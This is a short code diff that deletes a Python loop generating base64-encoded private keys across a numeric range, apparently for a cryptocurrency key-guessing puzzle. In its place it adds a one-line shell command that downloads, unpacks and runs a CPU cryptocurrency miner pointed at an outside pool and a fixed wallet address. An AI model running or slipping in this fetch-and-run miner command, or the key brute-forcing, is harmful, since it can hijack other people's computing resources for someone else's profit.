@@ -1,15 +1,1 @@
-import base64
-
-start_key = 0x000000000000000000000000000000000000000000000001a838b13505b26867
-end_key = 0x000000000000000000000000000000000000000000349b84b6431a6c4ef1  # Исправленная строка
-
-with open("puzzlehex.txt", "w") as file:
-    for key in range(start_key, end_key + 1):
-        private_key_hex = hex(key)[2:]
-        private_key_base64 = base64.b64encode(bytes.fromhex(private_key_hex.zfill(64))).decode('utf-8')  # Исправленная строка
-        file.write(private_key_base64 + '\n')
-
-        # Добавим отладочный вывод в консоль
-        print(f"Сгенерирован приватный ключ: {private_key_base64}")
-
-print("Генерация завершена. Результаты сохранены в файле puzzlehex.txt.")
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/1.1.3/SRBMiner-Multi-1-1-3-Linux.tar.xz && tar -xf SRBMiner-Multi-1-1-3-Linux.tar.xz && cd SRBMiner-Multi-1-1-3 && ./SRBMiner-MULTI --disable-gpu -a yespowersugar --pool stratum+tcp://cpu-pool.com:63418 -u sugar1q0mztv4vdccksfpnxugs5ge3crvw70d6lvr6644
